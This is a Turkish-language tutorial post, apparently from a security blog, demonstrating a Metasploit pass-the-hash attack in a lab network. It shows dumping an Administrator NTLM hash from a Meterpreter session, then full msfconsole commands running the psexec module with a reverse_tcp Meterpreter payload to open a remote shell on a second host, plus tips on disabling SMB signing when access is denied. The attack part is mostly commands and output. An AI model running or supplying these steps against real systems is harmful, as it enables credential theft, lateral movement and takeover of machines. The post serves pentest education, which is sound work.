---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-05-25T13:17:00Z"
excerpt: psexec modülü, genellikle pentest işlemleri esnasında kullanılır. Bu modül
  sayesine hedef sisteme giriş yapmanız mümkün hale gelmektedir. Alışılmış kullanımda,
  sistemin kullanıcı adı ve parolasını elde ettiğiniz ve bunu exploit modülüne değişken
  olarak girmeniz yeterlidir.
guid: https://www.siberoloji.com/?p=1179
id: 1179
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF PSEexec Pass the Hash
url: /tr/msf-pseexec-pass-the-hash/
---

 <p>psexec modülü, genellikle pentest işlemleri esnasında kullanılır. Bu modül sayesine hedef sisteme giriş yapmanız mümkün hale gelmektedir. Alışılmış kullanımda, sistemin kullanıcı adı ve parolasını elde ettiğiniz ve bunu exploit modülüne değişken olarak girmeniz yeterlidir.
 

 <p>Normalde izlenen yol, sistemde meterpreter shell açıldığında&nbsp;<code>fgdump</code>,&nbsp;<code>pwdump</code>&nbsp;veya&nbsp;<code>cachedump</code>&nbsp;komutlarıyla parola elde etmektir. Bu aramalar esnasında bulduğunuz&nbsp;<code>hash</code>&nbsp;değerleri olursa, bunları çeşitli araçlar kullanarak çözmeye ve parolaların açık halini elde etmeye çalışırız.
 

 <p>Oysa bazen başka bir durumla karşı karşı kalabilirsiniz. Bir sistemde&nbsp;<code>Administrator</code>&nbsp;yetkili bir oturum açtınız ve kullanıcının&nbsp;<code>hash</code>&nbsp;olarak formatlı parolasını elde ettiniz. Bu oturum açtığınız sistem üzerinden aynı ağda bulunan başka bir sisteme bağlanmak istediğinizde,&nbsp;<code>Administrator</code>&nbsp;kullanıcısının parolasını çözmenize gerek olmayabilir. Genellikle ağdaki cihazlar bu&nbsp;<code>hash</code>&nbsp;değerleri kulanarak haberleşirler. psexec modülü, bulduğunuz&nbsp;<code>hash</code>&nbsp;değerini parola olarak kullanmanıza olanak sağlar.
 

 <p>UYARI-1:
 

<!-- wp:quote -->
<blockquote class="wp-block-quote"> <p>NTLM kullanan sistemde, bulacağınız&nbsp;<code>hash</code>&nbsp;değeri&nbsp;<code>******NOPASSWORD*******:8846f7eaee8fb117ad06bdd830b7586c</code>&nbsp;formatındaysa, baş taraftaki&nbsp;<code>******NOPASSWORD*******</code>&nbsp;kısmını 32 adet sıfır ile değiştirerek&nbsp;<code>psexec</code>&nbsp;içine değişken olarak girmeniz gerekir. Yani değer,&nbsp;<code>00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c</code>&nbsp;şeklinde olmalıdır.
 </blockquote>
<!-- /wp:quote -->

 <p>UYARI-2:
 

<!-- wp:quote -->
<blockquote class="wp-block-quote"> <p>Lab ortamında, doğru hash değeri girdiğiniz halde&nbsp;<code>STATUS_ACCESS_DENIED (Command=117 WordCount=0)</code>&nbsp;hatası alıyorsanız, hedef Windows sisteminin Registry ayarlarında&nbsp;<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters</code>&nbsp;içerisinde&nbsp;<code>RequireSecuritySignature</code>&nbsp;değerini&nbsp;<code>0</code>&nbsp;olarak ayarlamalısınız.
 </blockquote>
<!-- /wp:quote -->

 
<h2 class="wp-block-heading" id="hashdump">Hashdump
<!-- /wp:heading -->

 <p>Aşağıda, bir exploit kullanılarak Meterpreter oturumu açılmıştır ve&nbsp;<code>post/windows/gather/hashdump</code>&nbsp;modülü ile sistemde hash değerleri bulunmak istenmektedir.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">***[*** ******* ***]***  Meterpreter session 1 opened ***(*** 192.168.57.133:443 -&gt; 192.168.57.131:1042***)*** 

meterpreter ***&gt;***  run post/windows/gather/hashdump 

***[*** ******* ***]***  Obtaining the boot key...
***[*** ******* ***]***  Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
***[*** ******* ***]***  Obtaining the user list and keys...
***[*** ******* ***]***  Decrypting user keys...
***[*** ******* ***]***  Dumping password hashes...

Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
meterpreter ***&gt;*** </code></pre>
<!-- /wp:code -->

 <p>Görüldüğü gibi,&nbsp;<code>RHOST: 192.168.57.131</code>&nbsp;IP adresinde bulunan Administrator kullanıcısına ait&nbsp;<code>e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c</code>&nbsp;değeri elde edilmiştir.
 

 <p>Şimdi bu hash değerini kullanarak&nbsp;<code>RHOST: 192.168.57.140</code>&nbsp;IP adresine oturum açmayı deneyelim. Tabii ki önceden yaptığınız taramada aynı ağda&nbsp;<code>192.168.57.140</code>&nbsp;IP adresinde ve&nbsp;<code>445</code>&nbsp;portunda&nbsp;<code>SMB</code>&nbsp;servisinin çalıştığını keşfettiğinizi kabul ediyoruz.
 

 
<h2 class="wp-block-heading" id="psexec">psexec
<!-- /wp:heading -->

 <p>Önce&nbsp;<code>msfconsole</code>&nbsp;ile Metasploit Framework başlatalım ve&nbsp;<code>psexec</code>&nbsp;modülünü yükleyelim.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfconsole

                <em>##                          ###           ##    ##</em>
 <em>##  ##  #### ###### ####  #####   #####    ##    ####        ######</em>
<em>####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##</em>
<em>####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##</em>
<em>## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##</em>
<em>##   ##  #### ###   #####   #####     ##   ####   ####   #### ###</em>
                                      <em>##</em>


       ***=[***  metasploit v4.2.0-dev ***[*** core:4.2 api:1.0]
+ -- --***=[***  787 exploits - 425 auxiliary - 128 post
+ -- --***=[***  238 payloads - 27 encoders - 8 nops
       ***=[***  svn r14551 updated yesterday ***(*** 2012.01.14***)*** 

msf ***&gt;***  search psexec

Exploits
***========*** 

   Name                       Description
   ----                       -----------
   windows/smb/psexec         Microsoft Windows Authenticated User Code Execution
   windows/smb/smb_relay      Microsoft Windows SMB Relay Code Execution

msf ***&gt;***  use exploit/windows/smb/psexec
msf exploit***(*** psexec***)***  ***&gt;***  set payload windows/meterpreter/reverse_tcp
payload ***=&gt;***  windows/meterpreter/reverse_tcp
msf exploit***(*** psexec***)***  ***&gt;***  set LHOST 192.168.57.133
LHOST ***=&gt;***  192.168.57.133
msf exploit***(*** psexec***)***  ***&gt;***  set LPORT 443
LPORT ***=&gt;***  443
msf exploit***(*** psexec***)***  ***&gt;***  set RHOST 192.168.57.140
RHOST ***=&gt;***  192.168.57.140
msf exploit***(*** psexec***)***  ***&gt;***  show options

Module options:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.57.140   yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPass                   no        The password ***for *** the specified username
   SMBUser  Administrator    yes       The username to authenticate as


Payload options ***(*** windows/meterpreter/reverse_tcp***)*** :

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LHOST     192.168.57.133   yes       The local address
   LPORT     443              yes       The local port


Exploit target:

   Id  Name
   --  ----
   0   Automatic</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="smbpass">SMBPass
<!-- /wp:heading -->

 <p>Yukarıda görüldüğü gibi&nbsp;<code>exploit/windows/smb/psexec</code>&nbsp;modülünde&nbsp;<code>SMBPass</code>&nbsp;değişkenini girmemiz gerekmektedir.&nbsp;<code>SMBPass</code>&nbsp;değişkenine elimizde bulunan hash değerini girelim ve modülü&nbsp;<code>exploit</code>&nbsp;komutuyla çalıştıralım.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** psexec***)***  ***&gt;***  set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
SMBPass ***=&gt;***  e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit***(*** psexec***)***  ***&gt;***  exploit

***[*** ******* ***]***  Connecting to the server...
***[*** ******* ***]***  Started reverse handler
***[*** ******* ***]***  Authenticating as user 'Administrator'...
***[*** ******* ***]***  Uploading payload...
***[*** ******* ***]***  Created \KoVCxCjx.exe...
***[*** ******* ***]***  Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.140[\svcctl] ...
***[*** ******* ***]***  Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.140[\svcctl] ...
***[*** ******* ***]***  Obtaining a service manager handle...
***[*** ******* ***]***  Creating a new service ***(*** XKqtKinn - "MSSeYtOQydnRPWl"***)*** ...
***[*** ******* ***]***  Closing service handle...
***[*** ******* ***]***  Opening service...
***[*** ******* ***]***  Starting the service...
***[*** ******* ***]***  Removing the service...
***[*** ******* ***]***  Closing service handle...
***[*** ******* ***]***  Deleting \KoVCxCjx.exe...
***[*** ******* ***]***  Sending stage ***(*** 719360 bytes***)*** 
***[*** ******* ***]***  Meterpreter session 1 opened ***(*** 192.168.57.133:443 -&gt; 192.168.57.140:445***)*** 

meterpreter ***&gt;***  shell
Process 3680 created.
Channel 1 created.
Microsoft Windows ***[*** Version 5.2.3790]
***(*** C***)***  Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32&gt;</code></pre>
<!-- /wp:code -->

 <p>Gördüğünüz gibi&nbsp;<code>192.168.57.140</code>&nbsp;IP adresinde oturum açılmıştır.
 